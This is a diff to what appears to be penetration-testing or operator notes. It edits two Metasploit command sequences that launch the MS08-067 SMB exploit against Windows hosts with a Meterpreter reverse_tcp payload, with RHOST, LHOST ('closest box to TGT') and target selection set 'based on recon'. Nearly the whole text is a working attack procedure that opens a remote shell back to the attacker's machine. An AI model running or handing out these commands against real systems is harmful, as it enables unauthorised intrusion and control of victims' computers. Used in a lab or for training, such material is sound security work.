@@ -23,11 +23,11 @@ ON KALI VM - Terminal #2
 anybody@kali > msfconsole
 msf > use exploit/windows/smb/ms08_067_netapi
 msf(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
-msf(ms08_067_netapi) > set RHOST 127.0.0.1
+msf(ms08_067_netapi) > set RHOST 0.0.0.0
 msf(ms08_067_netapi) > set RPORT 5445
 msf(ms08_067_netapi) > set LHOST 192.168.0.130 (closest box to TGT)
 msf(ms08_067_netapi) > set LPORT 8080
-msf(ms08_067_netapi) > set TARGET 4 (if XP SP2)
+msf(ms08_067_netapi) > set TARGET <pick target based on recon>
 msf(ms08_067_netapi) > show options
 msf(ms08_067_netapi) > exploit
 
@@ -111,7 +111,7 @@ ON KALI VM - Terminal #2
 anybody@kali > msfconsole
 msf > use exploit/windows/smb/ms08_067_netapi
 msf(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
-msf(ms08_067_netapi) > set RHOST 127.0.0.1
+msf(ms08_067_netapi) > set RHOST 0.0.0.0
 msf(ms08_067_netapi) > set RPORT 5445
 msf(ms08_067_netapi) > set LHOST 192.168.0.50 (closest box to TGT)
 msf(ms08_067_netapi) > set LPORT 9051
